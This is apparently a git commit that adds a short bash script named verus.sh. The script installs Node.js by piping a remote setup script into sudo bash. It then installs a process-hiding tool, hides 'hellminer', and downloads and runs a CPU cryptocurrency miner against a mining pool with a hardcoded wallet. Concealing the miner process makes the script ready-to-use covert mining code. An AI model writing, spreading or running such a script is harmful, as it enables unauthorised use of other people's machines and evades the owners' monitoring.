912a396908b3b3189fce36212a5675563798f509
thefacta <106053479+thefacta@users.noreply.github.com>
2022-05-23 13:46:04 +0700

    Create verus.sh

---
+++ verus.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+sudo apt update -y
+sudo apt install screen -y
+sudo apt install gcc -y 
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider 
+ph add hellminer
+wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+tar xf hellminer_cpu_linux.tar.gz
+./hellminer -c stratum+tcps://ap.luckpool.net:53956#xnsub -u RPiGL446F7Fa7bcQHcB3WrRSFXAtvB4LDx.bankbang -p x --cpu 3
